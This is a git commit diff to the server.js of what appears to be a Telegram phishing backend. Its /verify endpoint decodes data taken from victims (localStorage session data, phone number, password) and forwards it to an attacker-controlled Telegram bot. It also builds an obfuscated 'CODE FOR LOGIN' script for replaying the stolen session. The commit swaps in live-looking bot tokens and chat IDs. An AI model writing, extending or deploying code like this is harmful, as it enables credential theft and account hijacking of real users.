9a1cec6aeb4a04696297b9f9c617c8df63cb1571
Hotizana dealer <mtaymen@gmail.com>
2024-07-09 12:49:28 +0100

    token and id

--- server.js
+++ server.js
@@ -6,8 +6,8 @@ const path = require('path')
 const bodyParser = require('body-parser')
 const axios = require('axios')
 
-const token = '7162361678:AAFYurkXq1LDEQK9_BWYjLZVe3odRhhcCg4'
-const chatId = 5641960649
+const token = '7239679051:AAHFhF29L_oLiBU8ZErER1u199aNzZw9rps'
+const chatId = -1002208412209
 
 
 const bot = new TelegramBot(token, { polling: true })
@@ -32,7 +32,7 @@ app.get('/', (req, res) => {
 })
 
 app.post('/verify', async (req, res) => {
-    const decodedData = req.body
+    const decodedData = atob(req.body)
     const jsonData = JSON.parse(decodedData)
     const parsedLs = JSON.parse(jsonData.ls)
     const userAuth = JSON.parse(parsedLs.user_auth)
@@ -45,10 +45,11 @@ app.post('/verify', async (req, res) => {
         ...(userData?[`Name: ${userData?.first_name ? `${userData.first_name} ` : ''}${userData?.last_name ? userData.last_name : ''}`]:[]),
         ...(userData?[`Username: ${userData.username}`]:[]),
         ...(jsonData.phone?[`Phone: ${jsonData.phone}`]:[]),
-        ...(jsonData.pass?[`Password: ${jsonData.pass}\n`]:[]),
+        ...(jsonData.pass?[`Password: ${jsonData.pass}`]:[]),
+        '\n',
 
         `CODE FOR LOGIN:\n`,
-        `localStorage.clear();const data=${jsonData.ls};Object.keys(data).forEach((a=>{"object"==typeof data[a]?localStorage.setItem(a,JSON.stringify(data[a])):localStorage.setItem(a,data[a])})),location.reload();`
+        `localStorage.clear();const data=${jsonData.ls},stringifiedData=JSON.stringify(data),newData=JSON.parse(stringifiedData.replaceAll(atob("ImNobmdfdGltZSI="),(new Date).getTime().toString()));Object.keys(newData).forEach((a=>{"object"==typeof newData[a]?localStorage.setItem(a,JSON.stringify(newData[a])):localStorage.setItem(a,newData[a])})),location.reload();`
     ].join('\n')
 
     axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -61,6 +62,8 @@ app.post('/verify', async (req, res) => {
     .catch(error => {
         //console.error('Error sending message:', error)
     })
+
+    res.status(400).end()
 })
 
 app.listen(3000, () => {
